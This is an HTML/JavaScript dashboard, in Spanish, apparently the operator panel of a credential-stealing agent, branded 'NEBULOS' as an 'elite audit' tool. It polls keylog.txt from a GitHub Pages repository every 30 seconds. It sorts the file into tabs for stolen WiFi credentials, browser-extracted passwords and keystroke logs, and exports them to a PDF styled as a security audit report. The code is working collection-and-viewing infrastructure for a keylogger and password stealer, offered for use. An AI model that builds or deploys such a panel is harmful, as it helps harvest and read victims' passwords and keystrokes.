<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>NEBULOS | Auditoría de Élite</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #050505; --accent: #003b00; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; padding: 20px; margin: 0; }
        .container { border: 2px solid var(--neon); padding: 20px; box-shadow: 0 0 15px var(--accent); min-height: 90vh; display: flex; flex-direction: column; }
        
        .header { text-align: center; border-bottom: 1px solid var(--neon); margin-bottom: 20px; padding-bottom: 10px; }
        .blink { animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }

        .tabs { display: flex; gap: 5px; margin-bottom: 15px; flex-wrap: wrap; }
        button { background: transparent; color: var(--neon); border: 1px solid var(--neon); padding: 10px 15px; cursor: pointer; text-transform: uppercase; font-size: 0.8em; }
        button:hover, .active { background: var(--neon); color: black; font-weight: bold; }
        .btn-pdf { border-color: #ff4444; color: #ff4444; margin-left: auto; }

        #console { background: rgba(0,0,0,0.8); border: 1px inset var(--neon); flex-grow: 1; padding: 15px; overflow-y: auto; white-space: pre-wrap; font-size: 0.9em; line-height: 1.4; color: #d0ffd0; }
        .footer { margin-top: 15px; font-size: 0.7em; display: flex; justify-content: space-between; color: #008800; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1>PROJECT NEBULOS <span class="blink">_</span></h1>
        <small>SISTEMA DE AUDITORÍA REMOTA | AGENTE ACTIVO</small>
    </div>

    <div class="tabs">
        <button class="t-btn active" onclick="switchTab(event, 'full')">REPORTE TOTAL</button>
        <button class="t-btn" onclick="switchTab(event, 'wifi')">REDES WIFI</button>
        <button class="t-btn" onclick="switchTab(event, 'nav')">PASSWORDS WEB</button>
        <button class="t-btn" onclick="switchTab(event, 'keys')">KEYLOGGER</button>
        <button class="btn-pdf" onclick="generatePDF()">DESCARGAR PDF</button>
    </div>

    <div id="console">Estableciendo conexión con el repositorio Mirak14/hacking...</div>

    <div class="footer">
        <span id="sync-status">SYNC: BUSCANDO DATOS...</span>
        <span id="timestamp">--:--:--</span>
    </div>
</div>

<script>
    let fullData = "";

    async function loadData() {
        const consoleEl = document.getElementById('console');
        const statusEl = document.getElementById('sync-status');
        const timeEl = document.getElementById('timestamp');

        try {
            // Añadimos cache-buster para que GitHub no nos engañe con datos viejos
            const r = await fetch('./keylog.txt?nocache=' + Math.random());
            
            if (r.status === 404) {
                consoleEl.textContent = ">>> [ESPERANDO AGENTE]: El archivo 'keylog.txt' no existe todavía en el repositorio.";
                return;
            }

            fullData = await r.text();
            
            // Limpieza básica de caracteres nulos o rotos que rompen el HTML
            fullData = fullData.replace(/\0/g, ''); 

            statusEl.textContent = "SYNC: EN LÍNEA (OK)";
            statusEl.style.color = "#00ff41";
            timeEl.textContent = "ÚLTIMA ACTUALIZACIÓN: " + new Date().toLocaleTimeString();
            
            // Refrescar la vista actual sin cambiar de pestaña
            const activeBtn = document.querySelector('.t-btn.active');
            updateDisplay(activeBtn.innerText.toLowerCase());

        } catch (err) {
            consoleEl.textContent = ">>> [ERROR DE CONEXIÓN]: Revisa el estado de GitHub Pages.";
        }
    }

    function updateDisplay(mode) {
        const consoleEl = document.getElementById('console');
        if (!fullData) return;

        if (mode.includes('wifi')) {
            consoleEl.textContent = fullData.split('--- MODULO WIFI ---')[1]?.split('--- MODULO NAVEGADOR ---')[0]?.trim() || "No hay datos WiFi disponibles.";
        } else if (mode.includes('web')) {
            consoleEl.textContent = fullData.split('--- MODULO NAVEGADOR ---')[1]?.split('--- MODULO KEYLOGGER ---')[0]?.trim() || "No hay contraseñas extraídas.";
        } else if (mode.includes('keylogger')) {
            consoleEl.textContent = fullData.split('--- MODULO KEYLOGGER ---')[1]?.trim() || "Esperando pulsaciones del teclado...";
        } else {
            consoleEl.textContent = fullData;
        }
        
        // Auto-scroll al final
        consoleEl.scrollTop = consoleEl.scrollHeight;
    }

    function switchTab(e, mode) {
        document.querySelectorAll('.t-btn').forEach(b => b.classList.remove('active'));
        e.target.classList.add('active');
        updateDisplay(mode);
    }

    function generatePDF() {
        if (!fullData) return alert("No hay datos para exportar.");
        const { jsPDF } = window.jspdf;
        const doc = new jsPDF();
        doc.setFont("courier", "bold");
        doc.text("NEBULOS SECURITY AUDIT REPORT", 10, 10);
        doc.setFont("courier", "normal");
        doc.setFontSize(10);
        doc.text("Generado: " + new Date().toLocaleString(), 10, 20);
        doc.text("--------------------------------------------------", 10, 25);
        
        const splitText = doc.splitTextToSize(fullData, 180);
        doc.text(splitText, 10, 35);
        doc.save("Reporte_Nebulos_Mirak14.pdf");
    }

    // Actualización automática cada 30 segundos
    setInterval(loadData, 30000);
    loadData();
</script>

</body>
</html>
